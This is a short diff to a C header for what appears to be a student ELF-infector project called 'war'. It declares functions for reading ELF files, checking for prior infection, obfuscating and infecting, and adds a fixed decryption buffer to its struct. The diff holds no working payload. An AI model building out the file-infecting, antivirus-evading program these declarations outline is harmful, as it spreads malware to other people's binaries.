@@ -24,7 +24,7 @@ typedef struct s_war
     int             file_size;
     int             antivirus;
     char            *strtab;
-    char            *decrypted;
+    char            decrypted[1064];
     const char      *binary;
     unsigned char   *elf;
     void            *signd;
@@ -41,5 +41,9 @@ typedef struct s_war
 void    ft_antiprocess(t_war *war);
 char    *ft_getdir(int i);
 int     ft_checkarg(t_war *war);
+int     ft_readelf(t_war *war);
+int     ft_is_infection(t_war *war);
+void    ft_obfuscation(t_war *war);
+void    ft_infect(t_war *war);
 
 #endif
